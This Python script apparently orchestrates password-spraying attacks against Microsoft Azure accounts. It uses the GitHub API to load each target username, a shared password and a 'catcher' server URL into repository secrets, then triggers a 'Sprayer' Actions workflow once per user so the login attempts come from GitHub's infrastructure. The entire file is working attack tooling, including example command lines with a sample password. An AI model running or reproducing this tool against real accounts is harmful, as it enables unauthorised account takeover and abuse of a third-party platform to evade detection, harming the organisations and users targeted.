import requests
import sys
import time
import argparse
import configparser
import nacl.encoding
import nacl.public

# GitHub repository information
config = configparser.ConfigParser()
config.read("config.ini")

owner = config["GitHub"]["owner"]
repo = config["GitHub"]["repo"]
token = config["GitHub"]["token"]
workflow_name = "Sprayer"
public_key, key_id, workflow_id = None, None, None

# Request headers
github_actions_headers = {
    "Accept": "application/vnd.github+json",
    "Authorization": f"Bearer {token}",
    "X-GitHub-Api-Version": "2022-11-28",
}


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Perform password spraying against Microsoft Azure accounts using Github Actions.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Github Actions Fine-grained access token permissions required:\n"
        "actions:read\n"
        "actions:write\n"
        "secrets:read\n"
        "secrets:write\n"
        "\nExample Usage:\n\n"
        "python kicker.py -u userlist.txt -p Password123 --catcher http://127.0.0.1:5004/process_users\n"
        "python kicker.py -u userlist.txt -p Password123 --catcher https://127.0.0.1:5004/process_users --secure\n",
    )
    parser.add_argument(
        "-u",
        "--userlist",
        required=True,
        help="Path to a file containing usernames one-per-line in the format 'user@example.com'",
    )
    parser.add_argument(
        "-p",
        "--password",
        required=True,
        help="Password to be used for the password spraying.",
    )
    parser.add_argument(
        "-c",
        "--catcher",
        required=True,
        help="Address of the catcher web server - eg. http://<ip_address>:<port>/process.",
    )
    parser.add_argument(
        "-s",
        "--secure",
        default=False,
        action="store_true",
        help="Use this flag if the catcher web server uses TLS (default is False)",
    )
    return parser.parse_args()


# Function to check file exists and not empty
def check_file(file_path, file):
    try:
        with open(file_path) as f:
            if not any(line.strip() for line in f):
                raise ValueError(f"{file} file is empty.")
    except FileNotFoundError:
        print(f"{file} file '{file_path}' not found.")
        sys.exit(1)
    except ValueError as e:
        print(str(e))
        sys.exit(1)


# Function to get a repository public key
def fetch_public_key():
    url = f"https://api.github.com/repos/{owner}/{repo}/actions/secrets/public-key"
    response = requests.get(url, headers=github_actions_headers)
    if response.status_code == 200:
        data = response.json()
        key_id = data["key_id"]
        public_key = data["key"]
        print("[+] Public key fetched successfully.")
        return public_key, key_id
    else:
        print(
            f"[-] Failed to fetch public key - Status code: {response.status_code}. Exiting script."
        )
        sys.exit(1)


# Function to list repository workflows to get workflow ID
def fetch_workflow_id(workflow_name):
    url = f"https://api.github.com/repos/{owner}/{repo}/actions/workflows"
    response = requests.get(url, headers=github_actions_headers)
    if response.status_code == 200:
        data = response.json()
        for workflow in data["workflows"]:
            if workflow["name"] == workflow_name:
                workflow_id = workflow["id"]
                print(f"[+] Workflow ID for {workflow_name} fetched successfully.")
                return workflow_id
        print(f"[-] Workflow '{workflow_name}' not found.")
        sys.exit(1)
    else:
        print(
            f"[-] Failed to fetch workflows - Status code: {response.status_code}. Exiting script."
        )
        sys.exit(1)


# Function to create or update an environment secret
def update_secret(secret_name, secret_value, public_key, key_id):
    # Encrypt the secret value using the public key
    public_key_obj = nacl.public.PublicKey(
        public_key.encode(), encoder=nacl.encoding.Base64Encoder
    )
    sealed_box = nacl.public.SealedBox(public_key_obj)
    encrypted_secret = sealed_box.encrypt(secret_value.encode())
    encrypted_secret_base64 = nacl.encoding.Base64Encoder.encode(encrypted_secret)

    # API endpoint for the secret
    url = f"https://api.github.com/repos/{owner}/{repo}/actions/secrets/{secret_name}"

    # Request body for the secret
    data = {"encrypted_value": encrypted_secret_base64.decode(), "key_id": key_id}

    # Send PUT request to update the secret
    response = requests.put(url, headers=github_actions_headers, json=data)

    # Check if the secret was created or updated successfully
    if response.status_code == 201:
        print(f"[+] {secret_name} secret created successfully.")
        return True
    elif response.status_code == 204:
        print(f"[+] {secret_name} secret updated successfully.")
        return True
    else:
        print(
            f"[-] Failed to create or update {secret_name} secret - Status code: {response.status_code}"
        )
        return False


# Function to create a workflow dispatch event
def create_workflow_dispatch(username, workflow_id):
    url = f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches"
    data = {"ref": "main"}
    response = requests.post(url, headers=github_actions_headers, json=data)
    if response.status_code == 204:
        print(f"[+] Workflow dispatched successfully for {username}.")
    else:
        print(
            f"[-] Failed to dispatch workflow for {username} - Status code: {response.status_code}"
        )


def main():
    args = parse_arguments()

    # Get repository public key and workflow ID
    public_key, key_id = fetch_public_key()
    workflow_id = fetch_workflow_id(workflow_name)

    # Update password and catcher secrets
    # TODO: add target and other data here later to make this more modular
    secrets = [
        ("password", args.password),
        ("catcherurl", args.catcher),
        ("catchertls", str(args.secure)),
    ]

    for secret_name, secret_value in secrets:
        if not update_secret(secret_name, secret_value, public_key, key_id):
            print(f"[-] Failed to update {secret_name} secret. Exiting script.")
            sys.exit(1)

    # Check if the user list file is empty or not found
    check_file(args.userlist, "User list")
    # List of usernames to iterate through
    usernames = [line.strip() for line in open(args.userlist)]

    # Iterate through the usernames
    for username in usernames:
        # Update username secret
        if not update_secret("username", username, public_key, key_id):
            print(
                f"[-] Failed to update username secret for {username}. Exiting script."
            )
            sys.exit(1)

        # Create a workflow dispatch event
        create_workflow_dispatch(username, workflow_id)

        # give the secret some time to update
        time.sleep(3)


if __name__ == "__main__":
    main()


